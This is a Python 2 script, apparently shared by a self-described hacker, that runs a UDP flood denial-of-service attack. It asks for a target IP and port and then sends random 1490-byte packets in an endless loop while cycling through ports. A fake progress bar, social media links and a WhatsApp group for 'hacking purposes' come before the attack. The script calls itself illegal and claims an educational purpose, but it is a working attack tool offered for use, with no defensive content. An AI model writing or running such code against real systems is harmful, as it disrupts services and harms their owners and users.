print ("\033[93m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print ("\033[94m")
os.system("figlet welcome Abinong Bey")
print ("\033[93m")
os.system("toilet Bey DdoS -f slant")
print
print "Coded By : hacker bey"
print "Author   : Abinong Bey"
print "Insta Page   : https://instagram.com/abinong_bey?igshid=ZDdkNTZiNTM= "
print "Fb Page  : https://www.facebook.com/profile.php?id=100086025144264&mibextid=ZbWKwL"
print "WhatsApp Group : https://chat.whatsapp.com/H26KJPuKjrV4lgWWdgVZPA "
print "Join *Hackers Ahead* Group on WhatsApp To Get help on any hacking purposes"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk, i will not be Responsible For any Kind Of Problems"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[94m")
os.system("figlet DdoS Attack")
print("Team : Hackers Ahead")
print ("\033[92m")
print "[                      ] 0% "
time.sleep(3)
print "[========================= ] 25%"
time.sleep(4)
print "[==============================] 50%"
time.sleep(5)
print "[===================================] 75%"
time.sleep(6)
print "[========================================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
